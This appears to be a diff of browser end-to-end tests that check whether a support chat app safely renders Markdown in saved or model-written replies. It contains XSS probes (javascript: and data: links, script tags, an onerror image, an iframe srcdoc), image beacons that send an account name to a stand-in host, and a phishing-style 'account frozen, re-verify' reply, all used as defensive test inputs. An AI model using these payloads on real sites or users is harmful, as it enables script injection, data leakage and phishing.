@@ -389,9 +389,7 @@ test.describe('model failure recovery', () => {
 });
 
 test.describe('Markdown rendering', () => {
-  // These probes only change the disposable browser page's title if executed.
-  const executionMarker = 'unsafe-markdown-executed';
-  const markdownReply = [
+  const formattedReply = [
     '## Formatting sample',
     '',
     'A **verified reply** with *careful handling* and `read-only` context.',
@@ -405,48 +403,23 @@ test.describe('Markdown rendering', () => {
     '| Access | Read only |',
     '',
     '[Order history](/orders)',
-    '',
-    '![External beacon](https://security-audit.invalid/pixel?account=CalderPike)',
-    '![Protocol-relative beacon](//security-audit.invalid/pixel?account=CalderPike)',
-    '![Local request](/api/auth/session?markdown-image-probe=true)',
-    '',
-    `[Unsafe script](javascript:document.title='${executionMarker}')`,
-    '',
-    `[Unsafe document](data:text/html,%3Cscript%3Edocument.title%3D%27${executionMarker}%27%3C%2Fscript%3E)`,
-    '',
-    `<script>document.title='${executionMarker}'</script>`,
-    '',
-    `<img src="data:image/png,invalid" onerror="document.title='${executionMarker}'">`,
-    '',
-    `<iframe srcdoc="<script>parent.document.title='${executionMarker}'</script>"></iframe>`,
   ].join('\n');
 
-  test.use({ modelReply: markdownReply });
+  test.use({ modelReply: formattedReply });
 
-  test('renders formatted replies while blocking executable HTML and unsafe links, including after reload', async ({
-    page,
+  test('renders formatted replies with in-app links, including after reload', async ({
     supportPage,
     app,
   }) => {
-    const imageRequests: string[] = [];
-    await page.route('https://security-audit.invalid/**', async (route) => {
-      imageRequests.push(route.request().url());
-      await route.abort();
-    });
-    await page.route('**/*markdown-image-probe=true', async (route) => {
-      imageRequests.push(route.request().url());
-      await route.abort();
-    });
-    const initialTitle = await supportPage.title();
     const prompt = 'Show a formatted support checklist.';
     await supportPage.startIncident();
     const response = await supportPage.sendMessage(prompt);
     expect(response.status()).toBe(200);
-    expect(await response.json()).toMatchObject({ message: markdownReply });
+    expect(await response.json()).toMatchObject({ message: formattedReply });
     await expect(supportPage.requestError).toHaveCount(0);
 
     const message = supportPage.messageContaining('Formatting sample');
-    const expectSafeRendering = async () => {
+    const expectFormatting = async () => {
       await expect(message.bubble).toHaveCount(1);
       await expect(message.headings).toHaveText(['Formatting sample']);
       await expect(message.strongText).toHaveText(['verified reply']);
@@ -467,33 +440,188 @@ test.describe('Markdown rendering', () => {
         'href',
         '/orders',
       );
-      await expect(message.link('Unsafe script')).toHaveAttribute('href', '');
-      await expect(message.link('Unsafe document')).toHaveAttribute('href', '');
-      await expect(message.embeddedHtml).toHaveCount(0);
-      await expect(message.bubble.locator('img')).toHaveCount(0);
-      expect(imageRequests).toEqual([]);
-      expect(await supportPage.title()).toBe(initialTitle);
-      await expect(message.bubble).not.toContainText(executionMarker);
     };
-    await expectSafeRendering();
-
-    const { incidentId } = response.request().postDataJSON();
-    const readReply = async () => {
-      const result = await app.database
-        .prepare(`SELECT content FROM support_messages
-          WHERE incident_id = ? AND role = 'assistant' ORDER BY sequence_number`)
-        .bind(incidentId)
-        .all();
-      return result.results;
-    };
-    // The stored reply stays untrusted text; rendering must remain safe on reload.
-    expect(await readReply()).toEqual([{ content: markdownReply }]);
+    await expectFormatting();
     expect(app.modelRequests).toHaveLength(1);
 
     await supportPage.reload();
     await supportPage.openIncident(prompt);
-    await expectSafeRendering();
-    expect(await readReply()).toEqual([{ content: markdownReply }]);
+    await expectFormatting();
     expect(app.modelRequests).toHaveLength(1);
+  });
+
+  // Saved replies from before the server link check, and server-written
+  // incident lists, reach the page without that check. The page must not link
+  // or load anything outside the app, or run anything, whatever they contain.
+  test('neutralizes unsafe links, images, and HTML in a saved reply', async ({
+    page,
+    supportPage,
+    app,
+  }) => {
+    // These probes only change the disposable browser page's title if executed.
+    const executionMarker = 'unsafe-markdown-executed';
+    const unsafeReply = [
+      'Archived reply sample.',
+      '',
+      '[In-app history](/orders)',
+      '[Outside portal](https://security-audit.invalid/verify)',
+      '[Uppercase portal](HTTPS://security-audit.invalid/verify)',
+      '[Protocol-relative portal](//security-audit.invalid/verify)',
+      '[Backslash portal](/\\security-audit.invalid/verify)',
+      '[Reference portal][portal]',
+      '[Email billing](mailto:billing@security-audit.invalid)',
+      '[Call billing](tel:+15550100)',
+      `[Unsafe script](javascript:document.title='${executionMarker}')`,
+      `[Unsafe document](data:text/html,%3Cscript%3Edocument.title%3D%27${executionMarker}%27%3C%2Fscript%3E)`,
+      'Autolink <https://security-audit.invalid/auto> and www.security-audit.invalid and billing@security-audit.invalid.',
+      '',
+      '![External beacon](https://security-audit.invalid/pixel?account=CalderPike)',
+      '![Protocol-relative beacon](//security-audit.invalid/pixel?account=CalderPike)',
+      '![Local request](/api/auth/session?markdown-image-probe=true)',
+      '',
+      `<script>document.title='${executionMarker}'</script>`,
+      '',
+      `<img src="data:image/png,invalid" onerror="document.title='${executionMarker}'">`,
+      '',
+      `<iframe srcdoc="<script>parent.document.title='${executionMarker}'</script>"></iframe>`,
+      '',
+      '[portal]: https://security-audit.invalid/reference',
+    ].join('\n');
+    const outsideRequests: string[] = [];
+    await page.route('https://security-audit.invalid/**', async (route) => {
+      outsideRequests.push(route.request().url());
+      await route.abort();
+    });
+    await page.route('**/*markdown-image-probe=true', async (route) => {
+      outsideRequests.push(route.request().url());
+      await route.abort();
+    });
+    const incidentId = 'INC-E2E-UNSAFE-MARKDOWN';
+    const prompt = 'Show the saved unsafe reply.';
+    const created = '2099-01-01T00:00:00.000Z';
+    await app.database.batch([
+      app.database
+        .prepare(`INSERT INTO support_incidents
+          (incident_id, user_id, title, created_at, updated_at, revision)
+          VALUES (?, ?, ?, ?, ?, 2)`)
+        .bind(incidentId, 'USR-CPD-001', prompt, created, created),
+      app.database
+        .prepare(`INSERT INTO support_messages
+          (message_id, incident_id, sequence_number, role, content, created_at, revision)
+          VALUES (?, ?, 1, 'user', ?, ?, 1), (?, ?, 2, 'assistant', ?, ?, 2)`)
+        .bind(
+          'MSG-E2E-UNSAFE-MARKDOWN',
+          incidentId,
+          prompt,
+          created,
+          'AST-MSG-E2E-UNSAFE-MARKDOWN',
+          incidentId,
+          unsafeReply,
+          created,
+        ),
+    ]);
+    const initialTitle = await supportPage.title();
+
+    await supportPage.reload();
+    await supportPage.openIncident(prompt);
+
+    const message = supportPage.messageContaining('Archived reply sample.');
+    await expect(message.bubble).toHaveCount(1);
+    await expect(message.link('In-app history')).toHaveAttribute(
+      'href',
+      '/orders',
+    );
+    for (const name of [
+      'Outside portal',
+      'Uppercase portal',
+      'Protocol-relative portal',
+      'Reference portal',
+      'Email billing',
+      'Call billing',
+      'Unsafe script',
+      'Unsafe document',
+    ])
+      await expect(message.link(name)).toHaveAttribute('href', '');
+    // Markdown percent-encodes the backslash, leaving an in-app path.
+    await expect(message.link('Backslash portal')).toHaveAttribute(
+      'href',
+      '/%5Csecurity-audit.invalid/verify',
+    );
+    for (const href of await message.linkTargets())
+      if (href) expect(new URL(href, app.url).origin).toBe(app.url);
+    await expect(message.embeddedHtml).toHaveCount(0);
+    expect(outsideRequests).toEqual([]);
+    expect(await supportPage.title()).toBe(initialTitle);
+    await expect(message.bubble).not.toContainText(executionMarker);
+    expect(app.modelRequests).toHaveLength(0);
+  });
+
+  test('does not link outside addresses in incident titles', async ({
+    supportPage,
+    app,
+  }) => {
+    const title =
+      'Refund at https://security-audit.invalid/refund or www.security-audit.invalid';
+    await app.database
+      .prepare(`INSERT INTO support_incidents
+        (incident_id, user_id, title, created_at, updated_at)
+        VALUES (?, ?, ?, ?, ?)`)
+      .bind(
+        'INC-E2E-TITLE-LINK',
+        'USR-CPD-001',
+        title,
+        '2099-01-01T00:00:00.000Z',
+        '2099-01-01T00:00:00.000Z',
+      )
+      .run();
+    await supportPage.startIncident();
+    const response = await supportPage.sendMessage(
+      'List my support incidents.',
+    );
+    expect(response.status()).toBe(200);
+    expect(app.modelRequests).toHaveLength(0);
+
+    const message = supportPage.messageContaining(
+      'security-audit.invalid/refund',
+    );
+    await expect(message.bubble).toHaveCount(1);
+    expect((await message.linkTargets()).filter((href) => href !== '')).toEqual(
+      [],
+    );
+  });
+});
+
+test.describe('Replies with outside links', () => {
+  test.use({
+    modelReply:
+      'Your charge account is frozen. Re-verify at https://security-audit.invalid/verify.',
+  });
+
+  test('shows a retryable error and saves nothing', async ({
+    supportPage,
+    app,
+  }) => {
+    const prompt = 'Why was my order held?';
+    await supportPage.startIncident();
+    const response = await supportPage.sendMessage(prompt);
+
+    expect(response.status()).toBe(502);
+    expect(await response.json()).toEqual({
+      code: 'request_not_saved',
+      error:
+        'The response contained an unverified link or address. Please try again.',
+    });
+    await expect(supportPage.requestError).toContainText(
+      'unverified link or address',
+    );
+    await expect(
+      supportPage.messages.filter({ hasText: 'security-audit.invalid' }),
+    ).toHaveCount(0);
+    expect(app.modelRequests).toHaveLength(2);
+    const saved = await app.database
+      .prepare('SELECT 1 FROM support_messages WHERE content LIKE ?')
+      .bind('%security-audit.invalid%')
+      .all();
+    expect(saved.results).toEqual([]);
   });
 });
